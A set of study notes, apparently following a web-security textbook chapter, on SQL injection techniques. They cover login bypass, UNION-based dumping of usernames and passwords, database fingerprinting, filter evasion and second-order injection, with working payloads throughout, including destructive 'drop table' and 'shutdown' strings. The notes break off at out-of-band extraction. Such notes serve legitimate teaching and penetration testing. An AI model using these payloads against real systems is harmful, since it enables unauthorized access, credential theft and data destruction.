# Attacking Data Stores

- [Attacking Data Stores](#attacking-data-stores)
  - [Injecting into Interpreted Contexts](#injecting-into-interpreted-contexts)
    - [Bypassing a Login](#bypassing-a-login)
  - [Injecting into SQL](#injecting-into-sql)
    - [Exploiting a Basic Vulnerability](#exploiting-a-basic-vulnerability)
      - [Alternatives to Dealing with Trailing Quotes](#alternatives-to-dealing-with-trailing-quotes)
    - [Injecting into Different Statement Types](#injecting-into-different-statement-types)
      - [SELECT Statements](#select-statements)
      - [INSERT Statements](#insert-statements)
    - [Finding SQL Injection Bugs](#finding-sql-injection-bugs)
      - [Injecting into String Data](#injecting-into-string-data)
      - [Injecting into Numeric Data](#injecting-into-numeric-data)
      - [Injecting into the Query Structure](#injecting-into-the-query-structure)
    - [Fingerprinting the Database](#fingerprinting-the-database)
    - [The UNION Operator](#the-union-operator)
    - [Extracting Data with UNION](#extracting-data-with-union)
    - [Bypassing Filters](#bypassing-filters)
      - [Avoiding Blocked Characters](#avoiding-blocked-characters)
      - [Circumventing Simple Validation](#circumventing-simple-validation)
      - [Using SQL Comments](#using-sql-comments)
    - [Second-Order SQL Injection](#second-order-sql-injection)
    - [Advanced Exploitation](#advanced-exploitation)
      - [Retreiving Data as Numbers](#retreiving-data-as-numbers)
      - [Using an Out-of-Band Channel](#using-an-out-of-band-channel)

## Injecting into Interpreted Contexts

There are really only two main types of languages out there: compiled and interpreted. Compiled means that the code is turned into a binary file, while interpreted means that the code stays in the source format until run-time and is interpreted as it is run.

For whatever reason, the languages used to make web applications tend to be interpreted, a couple examples are: ```JS```, ```SQL```, ```LDAP```, ```Perl```, and ```PHP```. Given this, there is a larger chance of a certain type of vulnerability to show up, which is code injection.

### Bypassing a Login

In many cases where a web application has to access a data store to retreive information, it usually involves some sort of query. In security-sensitive logic such as logging in, a query might looks something like:

    SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’

This query will cause the db to check every row within the users table and extract each record where the <i>username</i> column has the value of ```marcus``` and the <i>password</i> column has the value of ```secret```.

One thing that could be done in this scenario is the use of modifying the logic. so let's say that the username of the site admin is ```admin```. This could be user in an attack that looks like:

    admin'--

The login is that the word ```admin``` was added and then completed with the single quotation mark. This would complete the statement and then you can add a comment of "```--```" that would comment the rest of the query, essentially bypassing the login. The final query would look like this:

    SELECT * FROM users WHERE username = ‘admin’--’ AND password = ‘foo’

This means that the query would look like this to the application:

    SELECT * FROM users WHERE username = ‘admin’

So the login is bypassed.

There are other behaviors that are exploitable such as using login within the query. For instance, if you do not know the username of the administrator, then you can try exploiting the logic of a given query. Example:

    ' OR 1=1--

This comments out the query with no username but gives another logic expression that returns ```true``` for all queries. The ```1=1``` section tests to see if 1=1, and indeed it does, which returns ```true```. Then the expression is closed out by the comment. The final expression would look like:

    SELECT * FROM users WHERE username = ‘’ OR 1=1--’ AND password = ‘foo’

    Thus the computer sees:

    SELECT * FROM users WHERE username = ‘’ OR 1=1

This would return all the details of all application users.

## Injecting into SQL

Databases are employed across many different applications in order to store information. They essentially have four different methods for interacting with data, which are: ```read```, ```update```, ```add```, and ```delete```. SQL injections can be devastating to a web application, but with the use of APIs, has become way more difficult. The main SQL servers are: Oracle, MS-SQL, and MySQL.

### Exploiting a Basic Vulnerability

So let's say that there is an online bookstore that allows you to search through a catalog of books. This server is using a SQL DB. When a search happens, this query is run:

    SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and published=1

Note a couple things:
- The words left of the equals symbol are SQL keywords and names of tables and columns within the DB.
  - This portion of the query was constructed by the programmer when the application was created.
- The expression ```Wiley``` is supplied by the user.
- String data (the ```Wiley``` expression) must be encapsulated within single quotation marks to seperate it from the rest of the query.

So given he query example, what would happen if we searched the publisher ```O'Reilly``` instead of ```Wiley```. The query would look something like:

    SELECT author,title,year FROM books WHERE publisher = ‘O’Reilly’ and published=1

In this case the query reaches the ```O'Reilly``` part, takes the ```O``` has the string and then encouters the expression ```Reilly```, which isn't an SQL expression, which generates the error:

    Incorrect syntax near ‘Reilly’.
    Server: Msg 105, Level 15, State 1, Line 1
    Unclosed quotation mark before the character string ‘

If the application behaves this way, it is wide open to SQL injection. Thus the attacker can:
1. Add a quotation mark to terminate the string.
2. Then write arbitrary SQL to modify the query.

Thus the user can run:

    Wiley' or 1=1--

Which looks like this on the server's end:

    SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR 1=1--’ and published=1

This modifies the ```WHERE``` clause to add a second condition. In this case when it checks if the user is ```Wiley```, the compared element may be ```potato```, but the second condition of ```1=1``` is always true, so the DB returns everything in the ```books``` table. Then the double hyphen ```--``` comments out the rest of the query. This is important as if this wasn't done, there would be an error in the expression. This allows the rest of the expression written by the programmer be ignored. This also did a thing that allowed the attacker to return the results of the unpublished books as the ```published``` expression was commented out.

<b>NOTE:</b> in MySQL, you need to include a space after the double hyphen, or use a hash character to specify the comment.

#### Alternatives to Dealing with Trailing Quotes

You may find that comments may not be handled well and thus you could compare strings to get the same effect as the ```1=1``` condition. For example:

    Wiley' OR 'a' = 'a

This results in the final query looking like:

    SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR ‘a’=’a’ and published=1

### Injecting into Different Statement Types

SQL has many different verbs that may appear at the beginning of statements. The most common verb to appear in SQL is ```SELECT```, thus it is most common to find vulnerabilities within this statement, but it is not the only one. Thus we will be discussing many others.

#### SELECT Statements

The ```SELECT``` statement is used for retrieving information from the DB. Usually, the exploit is performed within the ```WHERE``` clause of the ```SELECT``` statement. There are other parts of the ```SELECT``` statement that can affect the query, namely the ```ORDER BY``` clause.

#### INSERT Statements

```INSERT``` statements are used to create a new row of data within a table. These are typically used when:
- Adding a new entry to an audit log
- Creating a new user account
- Generating a new order

An example query for a self-registering application query:

    INSERT INTO users (username, password, ID, privs) VALUES (‘daf’,‘secret’, 2248, 1)

If the username and password field are vulnerable to SQL injection attacks, an attacker can insert arbitrary data into the table, including data for the ```ID``` and ```privs``` values. But to perform this attack, the attacker needs to make sure the ```VALUES``` clause is met. Thus it must contain the correct amount of data items of the correct types. An example of a correct injection would be:

    foo', 'bar', 9999, 0)--

This would allow a hacker to bypass as if the 0 at the end was left out the statement would fail. Note that the ```9999``` means the ID of the user, and ```0``` means a privilege level of "0", which usually means admin level.

Unfortunately, this attack is usually blind, thus the attacker has to perform tests to see if the attack can go through. So to meet the ```VALUES``` clause requirements, a user could try:

    foo')--
    foo', 1)--
    foo', 1, 1)--
    foo', 1, 1, 1)--
    
This is possible because in most DBs, integers are usually cast to strings. This means that the password part of ```1```, would be cast to a string of ```"1"```. If the value of 1 is still being rejected, then the value of ```2000``` might work. This is possibly implicitly cast to a date-based type.

#### UPDATE Statements

```UPDATE``` statements are used to modify one or more of the already existing rows within a table. Thus you will find these being used in user update functions like changing passwords or updating account information.

```UPDATE``` statements are similar to ```INSERT``` statements. One major difference is the included ```WHERE``` clause that tells the DB which rows of the table to change. Example of user changing password:

    UPDATE users SET password=’newsecret’ WHERE user = ‘marcus’ and password = ‘secret’

The above query has three inputted pieces of text. We can deduct that the application is checking to see if the user ```marcus``` with the password ```secret``` exists, and it so, then changes the password to ```newsecret```.

If this query was vulnerable to SQLi, then the attacker can bypass the existing password check and update the password of an admin through:

    admin'--

<b>NOTE:</b> there may be dangerous circumstances to SQLi, so given certain contexts, try and figure out what is going on so that it doesn't occur. For instance if the last query above was instead:

    admin’ or 1=1--

The end result query would be:

    UPDATE users SET password=’newsecret’ WHERE user = ‘admin’ or 1=1

This is problematic in that every user's password will change as 1=1 is always true. Thus, SQLi can be rather dangerous.

#### DELETE Statements

```DELETE``` statements are for deleting one or more rows of data within a table. Examples of this include deleting items from a shopping basket or removing information from a user's profile such as an address.

This is similar to the ```UPDATE``` statement as modifying this query can have dangerous consequences.

### Finding SQL Injection Bugs

Here we are going to breakdown a methodical way of finding SQLi vulnerabilities.

#### Injecting into String Data

When user-supplied data is put into a SQL query, it is encapsulated within single quotation marks. To exploit this, you need to break out of said quotation marks.

To exploit this:
1. Submit a single quotation mark and observe whether an error occurred. (Especially note if the error has something to do with SQL)
2. If Error occurred, submit two single quotation marks.
   1. These are seen as an escape sequence to represent a literal single quote.
   2. This means that the sequence is interpreted as data within the quoted string rather than the closing string terminator
   3. If this causes the error or weird behavior to disappear, then the application is most likely vuln to SQLi
3. For further verification, you can use SQL concatenator characters to construct a type of benign input. Here are some DB types that can check whether it is more likely vulnerable to SQLi:
   1. <b>Oracle:</b> &emsp; &emsp; ```'||'FOO```
   2. <b>MS-SQL:</b>&emsp;&emsp;```'+'FOO```
   3. <b>MySQL:</b>&emsp; &emsp; ```' 'FOO```
       - Note the Space between the quotes

<b>TIPS:</b>
1. Try to use an SQL wildcard character such as ```%```, which may return a ton of results. (Doesn't mean it's vulnerable)
2. While the single quotation mark might cause an error, make sure to look as the ```JS``` errors that occur as the single quotation mark might have broken the ```JS``` interpreter, which indicates a possible XSS vuln.

#### Injecting into Numeric Data

This is done by finding out whether or not numerical data will be interpreted within the SQL query. For instance, if a attacker was to put in ```1+1``` and it was to return a 2, just as simply putting in ```2``` in the first place, the application <i>may</i> be vulnerable.

If this first test is met with the interpretation of a simple mathematical expression, then the next step is to try more complicated expressions. A good example is the ```ASCII``` command.

    67-ASCII('A')

This statement is really just 67 minus the numerical value of ```A``` in ```ASCII``` which is 65. The net result is 2. Though, this test may not work is single quotes are being filtered. But there is another behavior to exploit. that being that DBs tend to convert numeric data into string data where required, Thus, lets say the number ```1```, which has an ```ASCII``` value of 49. Thus:

    51-ASCII(1)

This nets a result of 2.

<b>TIP:</b> Make sure to note that certain characters have a special meaning in HTTP requests, thus encoding is needed. Examples:
- ```&``` and ```=``` are used to join name/value pairs to create query string and block of ```POST``` data. Proper encoding is ```%26``` and ```%3d```.
- Literal spaces aren't allowed in the query string, to encode them, use a ```+``` or ```%20```.
- Due to ```+``` used to encode spaces, if the ```+``` was needed for an operation, use ```%2b```, thus ```1+1``` would turn into ```1%2b1```.
- Semicolons are used to seperate cookie fields, thus use ```%3b```.

#### Injecting into the Query Structure

There is a chance that when performing the SQLi, you may find yourself injecting directly into the query and not the item of data. In this case, you don't need to escape the data context. the most common area is inject in this way is the ```ORDER BY``` clause.

The ```ORDER BY``` clause is one that takes a column or number and orders the result set according to the values in the column. An example:

    SELECT author, title, year FROM books WHERE publisher = ‘Wiley’ ORDER BY title ASC

In this query, the column name ```title``` in the ```ORDER BY``` is specified by the user. Note that there is no need for a single quotation mark, the SQL can be directly modified.

To attempt to exploit this, follow these steps:

1. Note any parameters that appear to control the order or field types within the results that the application returns.
2. Make a series of requests supplying a numeric value in the parameter value, starting at 1 and increment it with each request.
   1. If the change in input affects the ordering of the results, the input is probably being inserted into an ```ORDER BY``` clause.
        - In SQL: ```ORDER BY``` orders by the first column.
        - Thus increasing to ```2``` should change display order of data by the 2nd column.
        - If the number supplied is greater than the number of columns, the query will fail.
    1. If supplying the number ```1``` causes a set of results with a column containing 1 in every row, the input is probably being inserted into the name of a column being returned by the query

        For example:

            SELECT 1,title,year FROM books WHERE publisher=’Wiley’

<b>NOTE:</b> Exploiting SQLi in an ```ORDER BY``` clause is different than most other cases. A DB won't accept a ```UNION```, ```WHERE```, ```OR```, or ```AND``` keywords at this point in the query.

### Fingerprinting the Database

With the more advanced an SQLi needs to be, the more prominent it is to find out the type and version of a DB. There are simple ways to find out the versions of a DB, but there are other ways, most notably is how DBs concatenate strings. Examples of how the string ```services``` could be constructed:

    Oracle:     'serv'||'ices'
    MS-SQL:     'serv'+'ices'
    MySQL:      'serv' 'ices' (note the space)

If injecting into numeric data, the following attack evaluates to 0 on the DB, thus generating an error.

    Oracle:     BITAND(1,1)-BITAND(1,1)
    MS-SQL:     @@PACK_RECEIVED-@@PACK_RECEIVED
    MySQL:      CONNECTION_ID()-CONNECTION_ID()

There is one more attack that only applies to MySQL's handling of inline comments. If the comment includes a ```!```, and then the correct version number, then the rest of the comment is handled like SQL for example:

    /*!32302 and 1=0*/

If the version number is greater than or equal to ```3.23.02```, thus the ```WHERE``` clause of a ```SELECT``` statement to be set to ```false```.

### The UNION Operator

The ```UNION``` operator is used to combine 2 or more ```SELECT``` statements into a single result set.

If the application contains a SQLi vuln within the ```SELECT``` statement, then you can employ the use of ```UNION``` to perform a second, entirely seperate query, which combines the results. An example with a search by publisher query, if you were to put:

    Wiley’ UNION SELECT username,password,uid FROM users--

The end result would look something like:

    SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ UNION SELECT username,password,uid FROM users--’

This would net both the books by wiley, and usernames/passwords/uids from the users table

<b>NOTE:</b> When the results are combined from the two queries, the column names will be the same as those returned by the first ```SELECT``` query.

There are 2 main caveats to the ```UNION``` operator attack:
1. The two result sets have to have the same structure. (same number of columns, appearing in the same order. Also the type of the data is important)
2. To inject the 2nd query, the attacker will need to know the name of the DB table and the column names.

Though it may seem like is rather hard to inject a query like it, the attack can be simple based on a couple of things.

- Though data types matter, they can usually be cast to other types implicitly. In fact, the ```NULL``` data type can be converted into any data type.
- Even if there was trapped error messages (you didn't see them client side), you can determine whether your attack was injected by the results of the query. If the injected query was executed, there will be additional results.
- The most prevalent solution is by identifying a single field within the original query that has a string data type.

To exploit this there a couple of systematic steps:

1. Discover the number of columns returned by the original query
   1. Use ```NULL``` as it can be converted into anything.
        
            ' UNION SELECT NULL--
            ' UNION SELECT NULL, NULL--
            ' UNION SELECT NULL, NULL, NULL--
    1. You can tell if it was executed successfully by an additional row of data being returned which will contain the word ```NULL``` or an empty string. (Also understand that it may be rendered with HTML making it difficult to see the empty row)
    2. The next task is to find a column that has a string data type. Use ```NULL``` and ```'a'``` with incrementing the index of the ```'a'```. For example:

            ‘ UNION SELECT ‘a’, NULL, NULL--
            ‘ UNION SELECT NULL, ‘a’, NULL--
            ‘ UNION SELECT NULL, NULL, ‘a’--
        - If any of the queries are executed successfully, you will see an additional column containing the letter ```'a'```.

<b>NOTE:</b> In Oracle DBs, every ```SELECT``` statement must include a ```FROM``` attribute, thus using ```UNION SELECT NULL``` produces an error regardless. Thus use the globally accessible table ```DUAL```.

    ‘ UNION SELECT NULL FROM DUAL--

Once you find the # of columns and one that is of a string data type you are ready to extract data. 

### Extracting Data with UNION

Here is an example with an address book application. Cconsider a request with the following parameter:

    Name=Matthew

Which returns:

    NAME:                   E-MAIL:
    Matthew Adamson         example@mail.com

Given this, it's probably querying a db. Thus we need to find the amount of columns. Thus we test one by one:

    Name=Matthew'%20union%20select%20null--

This gives up an error

<b>Note:</b> All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists. Thus you have to find the correct amount of columns.

So we add more nulls till we get something and:

    Name=Matthew’%20union%20select%20null,null,null,null,null--

Which produces the following:

    NAME:                   E-MAIL:
    Matthew Adamson         example@mail.com
    [empty]                 [empty]

Now we verify if the first column contains string data:

    Name=Matthew’%20union%20select%20’a’,null,null,null,null--

And the new result is:

    NAME:                   E-MAIL:
    Matthew Adamson         example@mail.com
    a

So now that we have the correct amount of columns and found one that contains string data we just have to find DB tables and columns that may have sensitive information. We can use a neat trick, that is table that contains metadata of all the tables on the DB: ```information_schema.columns```. So this is the query:

    Name=Matthew’%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--

Result:

    NAME:                   E-MAIL:
    Matthew Adamson         example@mail.com
    shop_items              price
    shop_items              prodid
    shop_items              prodname
    addr_book               contactemail
    addr_book               contactname
    users                   username
    users                   password

Now we have enough info for extracting from other parts of the DB. So we perform a query on the ```usernames``` and ```passwords``` of the ```users``` table:

    Name=Matthew’%20UNION%20select%20username,password,null,null,null%20from%20users--

Which Yields:

    NAME:                   E-MAIL:
    Matthew Adamson         example@mail.com
    administrator           fme69
    dev                     uber
    marcus                  8pinto
    smith                   twosixty
    jlo                     6kdown

This type of attack is possible on many DB types, but not Oracle, you would have to use the query of ```SELECT table_name, column_name FROM all_tab_columns```. Thus use:

    SELECT table_name,column_name FROM information_schema.columns where column_name LIKE ‘%PASS%’

<b>BIG NOTE:</b> When multiple columns are returned from a target table, you can concatenate them into a single column with:

    ORACLE:
    SELECT table_name||’:’||column_name FROM all_tab_columns

    MS-SQL:
    SELECT table_name+’:’+column_name from information_schema.columns

    MySQL:
    SELECT CONCAT(table_name,’:’,column_name) from information_schema.columns

### Bypassing Filters

In many cases today, there is gonig to be some sort of filtering. This could mean that the application will remove or sanitize certain characters, or block common SQL keywords. Though there are some workarounds.

#### Avoiding Blocked Characters

An application may block or encode single quotation marks, but they aren't needed if injecting into a numeric data field or column name. But if you need a string there are other methods:

    Given:
    select ename, sal from emp where ename=’marcus’

    Oracle:
    SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)

    MS-SQL:
    SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)

If the comment symbol is blocked, you may be able to not break syntax and work around it, thus:

    Instead of:
    ' or 1=1--

    You can use:
    ' or 'a'='a

#### Circumventing Simple Validation

As discusedd with simple validation techniques in past chapters, you can break the logic possibly with things like:

    SeLeCt
    %00SELECT
    SELSELECTECT
    %53%45%4c%45%43%54
    %2553%2545%254c%2545%2543%2554

#### Using SQL Comments

It is possible to add inline comments within SQL statements. It is done by using the ```/*example comment*/``` structure. Thus you can use comments as a means for simulating whitespace within the injected data:

    SELECT/*foo*/username,password/*foo*/FROM/*foo*/users

For MySQL, comments can even by inserted within keywords themselves such as:

    SEL/*foo*/ECT username,password FR/*foo*/OM users

### Second-Order SQL Injection

A second-order attack is one that requires data to be put within a query in one part and then to query that data to execute the data. This means that the first query isn't vulnerable while the second one is. For instance if you put in a query:

    Search term:
    O'Reilly

    Query:
    SELECT author,title,year FROM books WHERE publisher = ‘O’’Reilly’

Notice that the single quotation mark is doubled up. This is to allow the query to be handled as a literal. But it goes through nonetheless.

Now imagine this is a query with creating a user. If you put in a query with the username of ```foo'```:

    Query:
    INSERT INTO users (username, password, ID, privs) VALUES (‘foo’’’, ‘secret’, 2248, 1)

Now, if you were to change the password, it would have to query the username to pull the password, thus the query would look like:

    SELECT password FROM users WHERE username = ‘foo’’

This nets a result of an error:
    
    Unclosed quotation mark before the character string ‘foo

This signifies that it's vulnerable. Thus you could register the username:

    ‘ or 1 in (select password from users where username=’admin’)--

This results in an error:

    Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’ [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value ‘fme69’ to a column of data type int.

Notice that the password of the admin is disclosed: ```fme69```

### Advanced Exploitation

SQL injection knowedge has become a little more well known. This being the case, getting the results becomes a little more complicated.

There is also a whole area of destructive attacks possible such as the following:

Shutting of a DB:

    ' shutdown--

Dropping tables:

    ' drop table users--
    ' drop table accounts--
    ' drop table customers--

#### Retreiving Data as Numbers

String data may be handled properly within string data fields. This being said, it may be possible to exploit the numeric data fields.

String data can be converted to numeric form with the help of:

- ```ASCII```: returns the ASCII code for an inputted character
- ```SUBSTRING```: returns a substring of its input.

Examples in action:

    SUBSTRING('Admin', 1, 1)

This returns '```A```'.

    ASCII(SUBSTR(‘Admin’,1,1))

This returns ```65```.

These two methods can allow you to extract data one byte at a time.

#### Using an Out-of-Band Channel

Extracting data is rather diffcult with the modern ways that SQL is done within applications. Much of the time you aren't able to read the errors produced by the application